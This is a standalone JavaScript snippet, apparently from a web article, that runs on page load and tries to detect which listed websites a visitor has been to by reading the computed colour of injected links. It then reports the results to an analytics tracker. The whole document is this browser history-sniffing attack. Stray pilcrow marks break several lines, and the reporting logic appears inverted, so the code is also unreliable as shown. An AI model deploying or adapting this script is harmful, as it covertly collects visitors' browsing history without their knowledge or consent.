<script>
addEvent( window, 'load', stealHistory );

var IEVisitedColor 	= '#cd0018';
var W3CVisitedColor	= 'rgb(205, 0, 24)';

var websites = [
  "http://ajaxian.com/",
  "http://www.dicabrio.com",
  "http://www.vdgraaf.info",
  "http://www.reaact.net",
  "more of your sites...."
];

function stealHistory()
{
  if(document.getElementById('site-list'))
  {
    var List = document.getElementById('site-list');

    for( var i = 0; i < websites.length; i++ ) 
    {
      var bRemove = false;
      var ListItem = document.createElement('li');
      var Link = document.createElement( 'a' );
      Link.href = websites[i];
      Link.id = i;

      Link.appendChild(document.¶
createTextNode(websites[i]));
      ListItem.appendChild(Link);
      List.appendChild(ListItem);

      if( Link.currentStyle )
      {
        var color = Link.currentStyle['color'];
		
        if( color == IEVisitedColor )
        {
          bRemove = true;
        }
      }
      else if( document.defaultView.¶
getComputedStyle( Link, null ) )
      {
        var color = document.defaultView.¶
getComputedStyle( Link, null ).color;
        
        if( color == W3CVisitedColor )
        {
          bRemove = true;
        }
      }
			
      if( bRemove == true )
      {
        List.removeChild(ListItem);
      }
      else
      {
        urchinTracker( '/visited/' + websites[i] );
      }
    }
  }
}
</script>